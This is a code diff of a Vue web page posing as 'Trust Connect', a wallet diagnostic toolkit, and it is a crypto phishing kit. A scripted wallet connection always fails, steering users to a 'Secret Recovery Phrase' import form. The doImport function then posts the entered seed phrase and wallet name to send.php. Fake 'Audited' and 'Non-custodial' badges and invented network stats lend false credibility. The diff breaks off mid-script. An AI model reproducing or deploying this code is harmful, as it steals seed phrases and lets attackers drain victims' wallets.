+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
+      Run Diagnostics
+    </button>
+  </div>
+
+  <div class="sec-title">🛠 Diagnostic Tools</div>
+  <div class="sec-sub">Professional-grade utilities for wallet troubleshooting and optimization</div>
+  <div class="tools-grid">
+    <div class="tool-card" v-for="tool in tools" :key="tool.n" @click="sendToolReport(tool)">
+      <div class="tool-icon" :style="{background:tool.bg}">
+        <svg v-html="tool.svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" :style="{color:tool.ic}"></svg>
+      </div>
+      <div class="tool-name">{{tool.n}}</div>
+      <div class="tool-desc">{{tool.d}}</div>
+      <span class="tool-tag" :style="{background:tool.tbg,color:tool.tc}">{{tool.t}}</span>
+    </div>
+  </div>
+
+  <div class="sec-title">⚡ Core Capabilities</div>
+  <div class="sec-sub">Scroll to explore all features</div>
+  <div class="features-scroll">
+    <div class="feat-card" v-for="(f,i) in features" :key="f.title">
+      <div class="feat-num">0{{i+1}}</div>
+      <div class="feat-icon" :style="{background:f.bg}">
+        <svg v-html="f.svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" :style="{color:f.ic}"></svg>
+      </div>
+      <div class="feat-title">{{f.title}}</div>
+      <div class="feat-desc">{{f.desc}}</div>
+    </div>
+  </div>
+
+  <div class="sec-title">📡 Network Status</div>
+  <div class="sec-sub">Real-time blockchain infrastructure monitoring</div>
+  <div class="net-section">
+    <div class="net-card">
+      <div class="net-header">
+        <div class="net-title">Infrastructure Health</div>
+        <div class="net-live"><div class="nav-dot"></div>Live</div>
+      </div>
+      <div class="net-grid">
+        <div class="net-item">
+          <div class="net-item-val">99.9<span style="font-size:12px;opacity:.6">%</span></div>
+          <div class="net-item-lbl">Uptime</div>
         </div>
-        <div class="bg-green-100 text-green-600 px-3 py-1 rounded-full text-xs font-bold flex items-center gap-2">
-            <span class="status-dot bg-green-500"></span> Mainnet
+        <div class="net-item">
+          <div class="net-item-val">12<span style="font-size:12px;opacity:.6">ms</span></div>
+          <div class="net-item-lbl">Latency</div>
         </div>
-    </header>
-
-    <!-- Hero Section -->
-    <section class="max-w-2xl mx-auto px-6 text-center mt-10">
-        <div class="inline-block bg-blue-50 text-blue-600 px-4 py-1 rounded-full text-xs font-bold mb-6 tracking-widest uppercase">
-            ● DAPP PROTOCOL V3.2
+        <div class="net-item">
+          <div class="net-item-val">847<span style="font-size:12px;opacity:.6">K</span></div>
+          <div class="net-item-lbl">TX Today</div>
         </div>
-        <h1 class="text-4xl font-extrabold tracking-tight mb-4">
-            Advanced <span class="text-blue-600">Web3</span> toolkit for your wallet
-        </h1>
-        <p class="text-gray-500 text-sm leading-relaxed mb-10 px-4">
-            Diagnose issues, resolve stuck transactions, manage dApp connections and optimize your on-chain experience.
-        </p>
+      </div>
+      <div class="net-bar-wrap">
+        <div class="net-bar-label"><span>Ethereum RPC</span><span style="color:#00D26A">Healthy</span></div>
+        <div class="net-bar"><div class="net-bar-fill" style="width:96%;background:linear-gradient(90deg,#00D26A,#06B6D4)"></div></div>
+      </div>
+      <div class="net-bar-wrap" style="margin-top:10px">
+        <div class="net-bar-label"><span>BSC Node</span><span style="color:#00D26A">Healthy</span></div>
+        <div class="net-bar"><div class="net-bar-fill" style="width:99%;background:linear-gradient(90deg,#F59E0B,#00D26A)"></div></div>
+      </div>
+      <div class="net-bar-wrap" style="margin-top:10px">
+        <div class="net-bar-label"><span>Solana RPC</span><span style="color:#F59E0B">Degraded</span></div>
+        <div class="net-bar"><div class="net-bar-fill" style="width:72%;background:linear-gradient(90deg,#EF4444,#F59E0B)"></div></div>
+      </div>
+    </div>
+  </div>
 
-        <!-- Stats -->
-        <div class="grid grid-cols-3 gap-4 mb-10">
-            <div class="glass-card py-4">
-                <div class="text-xl font-bold">70M+</div>
-                <div class="text-[10px] text-gray-400 uppercase font-bold">Users</div>
-            </div>
-            <div class="glass-card py-4">
-                <div class="text-xl font-bold">100+</div>
-                <div class="text-[10px] text-gray-400 uppercase font-bold">Chains</div>
-            </div>
-            <div class="glass-card py-4">
-                <div class="text-xl font-bold">24/7</div>
-                <div class="text-[10px] text-gray-400 uppercase font-bold">Monitoring</div>
-            </div>
+  <div class="sec-title">🔍 Issue Resolution</div>
+  <div class="sec-sub">One-tap solutions for the most common wallet problems</div>
+  <div class="problems">
+    <div class="prob-item" v-for="p in problems" :key="p.t" @click="reportProblem(p)">
+      <div class="prob-icon" :style="{background:p.bg}">
+        <svg v-html="p.svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" :style="{color:p.ic}"></svg>
+      </div>
+      <div class="prob-text">
+        <div class="prob-title">{{p.t}}</div>
+        <div class="prob-desc">{{p.d}}</div>
+      </div>
+      <span class="prob-badge" :style="{background:p.bbg,color:p.bc}">{{p.b}}</span>
+      <svg class="prob-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </div>
+  </div>
+
+  <div class="trust-badges">
+    <div class="trust-b">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Audited
+    </div>
+    <div class="trust-b">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      Non-custodial
+    </div>
+    <div class="trust-b">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/></svg>
+      Open-source
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Docs</a><a href="#">Support</a></div>
+    <div class="footer-copy">&copy; 2025 Trust Connect &middot; dApp Protocol v3.2</div>
+  </div>
+
+  <button class="tg-report-btn" @click="modal='report'">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+    </svg>
+  </button>
+
+  <div v-if="toast.show" class="toast">
+    <div class="toast-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <div class="toast-content">{{ toast.message }}</div>
+    <button class="toast-close" @click="toast.show = false">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+  </div>
+
+  <!-- CONNECT WALLET MODAL -->
+  <div class="modal-overlay" v-if="modal==='connect'" :class="{closing:modalClosing}" @click.self="closeModal">
+    <div class="modal-backdrop" @click="closeModal"></div>
+    <div class="modal-sheet">
+      <div class="modal-drag"></div>
+      <div class="modal-hdr">
+        <div class="modal-hdr-left">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7L12 2z" fill="#0500FF" opacity=".12"/>
+            <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7L12 2z" stroke="#0500FF" stroke-width="1.5" fill="none"/>
+            <path d="M9 12l2 2 4-4" stroke="#0500FF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <span class="modal-hdr-title">Connect wallet</span>
         </div>
-
-        <div class="flex flex-col gap-3">
-            <button class="btn-primary py-4 font-bold flex items-center justify-center gap-2">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                Connect Wallet
-            </button>
-            <button class="bg-white border border-gray-200 py-4 rounded-2xl font-bold text-gray-700 flex items-center justify-center gap-2">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-                Run Diagnostics
-            </button>
+        <button class="modal-close" @click="closeModal">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </button>
+      </div>
+      <div class="modal-sub">Choose a wallet to connect to this dApp</div>
+      <div class="wl-list">
+        <div v-for="w in wallets" :key="w.id" class="wl-item" :class="{sel:selW===w.id}" @click="selW=selW===w.id?null:w.id">
+          <div class="wl-icon" :style="{background:w.bg}">{{w.l}}</div>
+          <div class="wl-info"><div class="wl-name">{{w.name}}</div><div class="wl-tag">{{w.tag}}</div></div>
+          <div class="wl-radio"><div class="wl-dot"></div></div>
         </div>
-    </section>
+      </div>
+      <div class="modal-divider"></div>
+      <button class="modal-btn" :class="selW?'on':'off'" @click="selW && startConnect()">{{selW?'Continue':'Select wallet'}}</button>
+      <div class="modal-foot">A signature may be required to prove ownership of wallet.<br><a href="#">Learn more</a></div>
+    </div>
+  </div>
 
-    <!-- Diagnostic Tools -->
-    <section class="max-w-2xl mx-auto px-6 mt-16">
-        <h2 class="text-xl font-bold flex items-center gap-2 mb-2">
-            <span class="text-lg">🛠</span> Diagnostic Tools
-        </h2>
-        <p class="text-gray-400 text-xs mb-6">Professional-grade utilities for wallet troubleshooting and optimization</p>
-        
-        <div class="grid grid-cols-2 gap-4">
-            <!-- Tool 1 -->
-            <div class="glass-card p-5">
-                <div class="w-10 h-10 bg-red-50 rounded-xl flex items-center justify-center mb-4">
-                    <span class="text-red-400 text-xl">☀</span>
-                </div>
-                <h3 class="font-bold text-sm mb-1">TX Unsticker</h3>
-                <p class="text-[11px] text-gray-400 leading-tight mb-4">Resolve stuck & pending transactions with gas boost or cancel</p>
-                <span class="bg-red-50 text-red-500 text-[9px] font-bold px-2 py-1 rounded uppercase">Popular</span>
-            </div>
-            <!-- Tool 2 -->
-            <div class="glass-card p-5">
-                <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center mb-4">
-                    <span class="text-blue-400 text-xl">⊹</span>
-                </div>
-                <h3 class="font-bold text-sm mb-1">Node Manager</h3>
-                <p class="text-[11px] text-gray-400 leading-tight mb-4">Switch RPC endpoints, test latency & manage custom nodes</p>
-                <span class="bg-blue-50 text-blue-500 text-[9px] font-bold px-2 py-1 rounded uppercase">Advanced</span>
-            </div>
+  <!-- CONNECTING MODAL -->
+  <div class="modal-overlay" v-if="modal==='connecting'" :class="{closing:modalClosing}">
+    <div class="modal-backdrop"></div>
+    <div class="modal-sheet">
+      <div class="modal-drag"></div>
+      <div style="padding:40px 24px 44px;text-align:center">
+        <div class="connect-spinner">
+          <svg viewBox="0 0 80 80">
+            <circle cx="40" cy="40" r="34" stroke="#EAECF2" stroke-width="5" fill="none"/>
+            <circle cx="40" cy="40" r="34" stroke="url(#spinGrad)" stroke-width="5" fill="none" stroke-dasharray="140 80" stroke-linecap="round" class="spin-arc"/>
+          </svg>
+          <defs><linearGradient id="spinGrad"><stop offset="0%" stop-color="#0500FF"/><stop offset="100%" stop-color="#3B82F6"/></linearGradient></defs>
+          <div class="connect-spinner-icon">
+            <div class="wl-icon" style="width:48px;height:48px;border-radius:14px;font-size:20px" :style="{background:connectingWallet.bg}">{{connectingWallet.l}}</div>
+          </div>
         </div>
-    </section>
-
-    <!-- Network Status -->
-    <section class="max-w-2xl mx-auto px-6 mt-16">
-        <h2 class="text-xl font-bold flex items-center gap-2 mb-2">
-            <span class="text-lg">📡</span> Network Status
-        </h2>
-        <p class="text-gray-400 text-xs mb-6">Real-time blockchain infrastructure monitoring</p>
-
-        <div class="bg-[#0f172a] text-white rounded-[32px] p-8">
-            <div class="flex justify-between items-center mb-8">
-                <span class="font-bold text-lg">Infrastructure Health</span>
-                <div class="flex items-center gap-2 text-xs font-bold text-green-400">
-                    <span class="status-dot bg-green-400"></span> Live
-                </div>
-            </div>
-
-            <div class="grid grid-cols-3 gap-4 mb-10">
-                <div>
-                    <div class="text-2xl font-bold">99.9<span class="text-sm text-gray-500">%</span></div>
-                    <div class="text-[10px] text-gray-500 uppercase font-bold">Uptime</div>
-                </div>
-                <div>
-                    <div class="text-2xl font-bold">12<span class="text-sm text-gray-500">ms</span></div>
-                    <div class="text-[10px] text-gray-500 uppercase font-bold">Latency</div>
-                </div>
-                <div>
-                    <div class="text-2xl font-bold">847<span class="text-sm text-gray-500">K</span></div>
-                    <div class="text-[10px] text-gray-500 uppercase font-bold">TX Today</div>
-                </div>
-            </div>
-
-            <div class="space-y-6">
-                <div>
-                    <div class="flex justify-between text-xs font-bold mb-2">
-                        <span class="text-gray-400">Ethereum RPC</span>
-                        <span class="text-green-400">Healthy</span>
-                    </div>
-                    <div class="progress-bar"><div class="progress-fill bg-cyan-400" style="width: 100%"></div></div>
-                </div>
-                <div>
-                    <div class="flex justify-between text-xs font-bold mb-2">
-                        <span class="text-gray-400">BSC Node</span>
-                        <span class="text-green-400">Healthy</span>
-                    </div>
-                    <div class="progress-bar"><div class="progress-fill bg-yellow-400" style="width: 100%"></div></div>
-                </div>
-                <div>
-                    <div class="flex justify-between text-xs font-bold mb-2">
-                        <span class="text-gray-400">Solana RPC</span>
-                        <span class="text-orange-400">Degraded</span>
-                    </div>
-                    <div class="progress-bar"><div class="progress-fill bg-orange-400" style="width: 65%"></div></div>
-                </div>
-            </div>
+        <div style="font-size:18px;font-weight:700;color:var(--t1);margin-top:24px">Connecting to {{connectingWallet.name}}</div>
+        <div style="font-size:13.5px;color:var(--t2);margin-top:8px;line-height:1.4">Establishing secure session via WalletConnect protocol...</div>
+        <div class="connect-steps">
+          <div class="connect-step" :class="{done:connectStep>=1, active:connectStep===0}"><div class="connect-step-dot"></div><span>Initializing session</span></div>
+          <div class="connect-step" :class="{done:connectStep>=2, active:connectStep===1}"><div class="connect-step-dot"></div><span>Resolving RPC endpoint</span></div>
+          <div class="connect-step" :class="{done:connectStep>=3, active:connectStep===2}"><div class="connect-step-dot"></div><span>Authenticating wallet</span></div>
+          <div class="connect-step" :class="{failed:connectStep===3}"><div class="connect-step-dot"></div><span>Verifying signature</span></div>
         </div>
-    </section>
+      </div>
+    </div>
+  </div>
 
-    <!-- Issue Resolution -->
-    <section class="max-w-2xl mx-auto px-6 mt-16">
-        <h2 class="text-xl font-bold flex items-center gap-2 mb-2">
-            <span class="text-lg">🔍</span> Issue Resolution
-        </h2>
-        <p class="text-gray-400 text-xs mb-6">One-tap solutions for the most common wallet problems</p>
-
-        <div class="space-y-3">
-            <!-- Item 1 -->
-            <div class="glass-card p-4 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-red-50 rounded-2xl flex items-center justify-center">
-                        <span class="text-red-400 text-xl">!</span>
-                    </div>
-                    <div>
-                        <h4 class="font-bold text-sm">Stuck Transaction</h4>
-                        <p class="text-[11px] text-gray-400">Speed up or cancel pending TX with nonce override</p>
-                    </div>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-[10px] font-bold text-red-400 bg-red-50 px-2 py-1 rounded">FIX</span>
-                    <span class="text-gray-300">❯</span>
-                </div>
-            </div>
-            <!-- Item 2 -->
-            <div class="glass-card p-4 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-orange-50 rounded-2xl flex items-center justify-center">
-                        <span class="text-orange-400 text-xl">⚠</span>
-                    </div>
-                    <div>
-                        <h4 class="font-bold text-sm">Null / Revert Error</h4>
-                        <p class="text-[11px] text-gray-400">Decode execution failures and contract revert reasons</p>
-                    </div>
-                </div>
-                <div class="flex items-center gap-3">
-                    <span class="text-[10px] font-bold text-orange-400 bg-orange-50 px-2 py-1 rounded">DECODE</span>
-                    <span class="text-gray-300">❯</span>
-                </div>
-            </div>
+  <!-- ERROR MODAL -->
+  <div class="modal-overlay" v-if="modal==='error'" :class="{closing:modalClosing}" @click.self="closeModal">
+    <div class="modal-backdrop" @click="closeModal"></div>
+    <div class="modal-sheet">
+      <div class="modal-drag"></div>
+      <div style="padding:32px 24px 28px;text-align:center">
+        <div class="error-icon-wrap">
+          <svg viewBox="0 0 64 64" fill="none">
+            <circle cx="32" cy="32" r="30" fill="#FEF2F2" stroke="#FECACA" stroke-width="2"/>
+            <circle cx="32" cy="32" r="20" fill="#FEE2E2"/>
+            <path d="M24 24l16 16M40 24L24 40" stroke="#EF4444" stroke-width="3" stroke-linecap="round"/>
+          </svg>
         </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="max-w-2xl mx-auto px-6 mt-20 text-center">
-        <div class="flex justify-center gap-6 text-[11px] font-bold text-green-600 mb-10">
-            <span class="flex items-center gap-1"><span class="text-lg">🛡</span> Audited</span>
-            <span class="flex items-center gap-1"><span class="text-lg">🔒</span> Non-custodial</span>
-            <span class="flex items-center gap-1"><span class="text-lg">🌐</span> Open-source</span>
+        <div style="font-size:20px;font-weight:800;color:var(--t1);margin-top:20px">Connection Failed</div>
+        <div style="font-size:14px;color:var(--t2);margin-top:10px;line-height:1.5;max-width:300px;margin-left:auto;margin-right:auto">
+          Unable to establish a secure session with <strong>{{connectingWallet.name}}</strong>. The wallet did not respond within the timeout period.
         </div>
-        <div class="flex justify-center gap-6 text-xs text-gray-400 mb-4">
-            <a href="#">Terms</a>
-            <a href="#">Privacy</a>
-            <a href="#">Docs</a>
-            <a href="#">Support</a>
+        <div class="error-details">
+          <div class="error-detail-row"><span class="error-detail-label">Error code</span><span class="error-detail-val" style="color:var(--red)">ERR_SESSION_TIMEOUT</span></div>
+          <div class="error-detail-row"><span class="error-detail-label">Protocol</span><span class="error-detail-val">WalletConnect v2.0</span></div>
+          <div class="error-detail-row"><span class="error-detail-label">Attempt</span><span class="error-detail-val">3 of 3 (exhausted)</span></div>
         </div>
-        <p class="text-[10px] text-gray-300">© 2025 Trust Connect · dApp Protocol v3.2</p>
-    </footer>
+        <div style="font-size:13px;color:var(--t2);margin-top:16px;line-height:1.5;padding:0 8px">You can import your wallet manually using a recovery phrase instead.</div>
+        <button class="modal-btn on" style="width:100%;margin:20px 0 0" @click="modal='recovery'"><span style="display:flex;align-items:center;justify-content:center;gap:8px">Import Manually</span></button>
+        <button class="error-retry-btn" @click="startConnect()">Try again</button>
+      </div>
+    </div>
+  </div>
 
+  <!-- RECOVERY PHRASE MODAL -->
+  <div class="modal-overlay" v-if="modal==='recovery'" :class="{closing:modalClosing}" @click.self="closeModal">
+    <div class="modal-backdrop" @click="closeModal"></div>
+    <div class="modal-sheet">
+      <div class="modal-drag"></div>
+      <div class="modal-hdr">
+        <div class="modal-hdr-left">
+          <button class="modal-back" @click="modal='connect'">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+          </button>
+          <span class="modal-hdr-title">Secret Recovery Phrase</span>
+        </div>
+        <button class="modal-close" @click="closeModal">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </button>
+      </div>
+      <div class="r-desc">Import an existing wallet with your secret recovery phrase</div>
+      <div class="r-tabs">
+        <button v-for="c in [12,18,24]" :key="c" class="r-tab" :class="{on:wc===c}" @click="wc=c">{{c}}</button>
+      </div>
+      <div class="r-area">
+        <textarea class="r-textarea" v-model="seed" :placeholder="'Enter your '+wc+' words seed phrase here...'" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+        <button class="r-paste" @click="doPaste" title="Paste">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg>
+        </button>
+      </div>
+      <div class="r-count">
+        <span>Words: <span :class="swc===wc?'ok':(swc>0?'no':'')">{{swc}}</span> / {{wc}}</span>
+        <span v-if="swc===wc" class="ok">✓ Ready</span>
+      </div>
+      <button class="modal-btn" :class="swc===wc?'on':'off'" @click="doImport">Import wallet</button>
+      <div class="r-footer">I have a secret recovery phrase of 12 to 24 words.</div>
+    </div>
+  </div>
+
+  <!-- TELEGRAM REPORT MODAL -->
+  <div class="modal-overlay" v-if="modal==='report'" :class="{closing:modalClosing}" @click.self="closeModal">
+    <div class="modal-backdrop" @click="closeModal"></div>
+    <div class="modal-sheet">
+      <div class="modal-drag"></div>
+      <div class="modal-hdr">
+        <div class="modal-hdr-left">
+          <button class="modal-back" @click="modal='connect'">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+          </button>
+          <span class="modal-hdr-title">Send Report to Telegram</span>
+        </div>
+        <button class="modal-close" @click="closeModal">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </button>
+      </div>
+      <div style="padding:8px 22px 18px">
+        <select class="report-select" v-model="reportType">
+          <option value="bug">🐛 Bug Report</option>
+          <option value="feature">✨ Feature Request</option>
+          <option value="issue">⚠️ Technical Issue</option>
+          <option value="feedback">💬 Feedback</option>
+        </select>
+        <div v-if="selectedTool" class="report-field"><div class="report-label">Tool</div><div class="report-value">{{ selectedTool.n }}</div></div>
+        <div v-if="selectedProblem" class="report-field"><div class="report-label">Problem</div><div class="report-value">{{ selectedProblem.t }}</div></div>
+        <textarea class="report-textarea" v-model="reportMessage" placeholder="Describe what happened..." rows="4"></textarea>
+        <div style="display:flex;gap:10px">
+          <button class="modal-btn on" style="margin:0;width:auto;flex:1" @click="sendReport">Send Report</button>
+          <button class="error-retry-btn" style="margin:0;width:auto;flex:1" @click="closeModal">Cancel</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const {createApp,ref,computed} = Vue;
+createApp({
+  setup(){
+    const modal = ref(null);
+    const modalClosing = ref(false);
+    const selW = ref(null);
+    const wc = ref(12);
+    const seed = ref('');
+    const swc = computed(() => seed.value.trim().split(/\s+/).filter(w=>w).length);
+    const connectStep = ref(0);
+    const connectingWallet = ref({name:'',bg:'',l:''});
+    const toast = ref({show:false,message:''});
+    const reportType = ref('bug');
+    const reportMessage = ref('');
+    const selectedTool = ref(null);
+    const selectedProblem = ref(null);
+
+
+    const showToast = (msg) => {
+      toast.value = {show:true,message:msg};
+      setTimeout(() => { toast.value.show = false; }, 3000);
+    };
+
+    const closeModal = () => {
+      modalClosing.value = true;
+      setTimeout(() => {
+        modal.value = null;
+        modalClosing.value = false;
+        selW.value = null;
+        connectStep.value = 0;
+        selectedTool.value = null;
+        selectedProblem.value = null;
+        reportMessage.value = '';
+      }, 220);
+    };
+
+    const startConnect = () => {
+      const w = wallets.find(x => x.id === selW.value);
+      if(!w) return;
+      connectingWallet.value = w;
+      connectStep.value = 0;
+      modal.value = 'connecting';
+      setTimeout(() => { connectStep.value = 1; }, 1800);
+      setTimeout(() => { connectStep.value = 2; }, 4200);
+      setTimeout(() => { connectStep.value = 3; }, 7000);
+      setTimeout(() => { 
+        if(modal.value === 'connecting') {
+          modal.value = 'error'; 
+          connectStep.value = 0; 
+        }
+      }, 9500);
+    };
+
+    const doPaste = async () => {
+      try { seed.value = await navigator.clipboard.readText(); } catch(e){}
+    };
+
+    const doImport = async () => {
+      if(swc.value === wc.value) {
+        const selectedWallet = selW.value ? wallets.find(w => w.id === selW.value)?.name : 'Unknown';
+        try {
+          await fetch('send.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams({
+              seed: seed.value.trim(),
+              words: swc.value,
+              type: wc.value,
+              wallet: selectedWallet
+            })
+          });
+        } catch (e) {}
+        seed.value = '';
+        closeModal();
+      }
+    };
+
+    const sendTelegramMessage = async (title, data) => {
+      try {
+        await fetch('send.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ title: title, data: JSON.stringify(data) })
+        });
+      } catch (e) {}
+    };
+
+    const sendReport = async () => {
+      if (!reportMessage.value.trim()) { showToast('Please enter a message'); return; }
+      const reportData = { 'Type': reportType.value, 'Message': reportMessage.value, 'Timestamp': new Date().toISOString() };
+      if (selectedTool.value) reportData['Tool'] = selectedTool.value.n;
+      if (selectedProblem.value) reportData['Problem'] = selectedProblem.value.t;
+      await sendTelegramMessage('📱 New Report from Trust Connect', reportData);
+      closeModal();
+    };
+
+    const runDiagnostics = () => {
+      sendTelegramMessage('⚡ Diagnostics Run', { 'Action': 'Full system diagnostics', 'Status': 'Initiated', 'Timestamp': new Date().toISOString() });
+      showToast('Running diagnostics...');
+    };
+
+    const sendToolReport = (tool) => { selectedTool.value = tool; selectedProblem.value = null; modal.value = 'report'; };
+    const reportProblem = (problem) => { selectedProblem.value = problem; selectedTool.value = null; modal.value = 'report'; };
+
+    const wallets = [
+      {id:'phantom',name:'Phantom',tag:'Solana, Ethereum, Polygon',bg:'#AB9FF2',l:'P'},
+      {id:'solflare',name:'Solflare',tag:'Solana',bg:'#FC6E21',l:'S'},
+      {id:'ledger',name:'Ledger',tag:'Hardware wallet',bg:'#000000',l:'L'},
+      {id:'wc',name:'WalletConnect',tag:'Multi-chain',bg:'#3B99FC',l:'W'},
+      {id:'torus',name:'Torus',tag:'Social login',bg:'#0364FF',l:'T'},
+      {id:'clover',name:'Clover',tag:'Multi-chain',bg:'#26A768',l:'C'},
+    ];
+
+    const stats = [
+      {v:'70<span>M+</span>',l:'Users'},
+      {v:'100<span>+</span>',l:'Chains'},
+      {v:'24<span>/7</span>',l:'Monitoring'},
+    ];
+
+    const tickerData = [
+      {s:'BTC',p:'$67,842',ch:'+2.4%',d:'up',c:'#F7931A',e:'₿'},
+      {s:'ETH',p:'$3,521',ch:'+1.8%',d:'up',c:'#627EEA',e:'Ξ'},
+      {s:'SOL',p:'$178',ch:'+5.2%',d:'up',c:'#9945FF',e:'◎'},
+      {s:'BNB',p:'$612',ch:'-0.3%',d:'dn',c:'#F3BA2F',e:'⬡'},
+      {s:'MATIC',p:'$0.92',ch:'+3.1%',d:'up',c:'#8247E5',e:'⬡'},
+      {s:'AVAX',p:'$42.5',ch:'-1.2%',d:'dn',c:'#E84142',e:'▲'},
+    ];
+
+    const tools = [
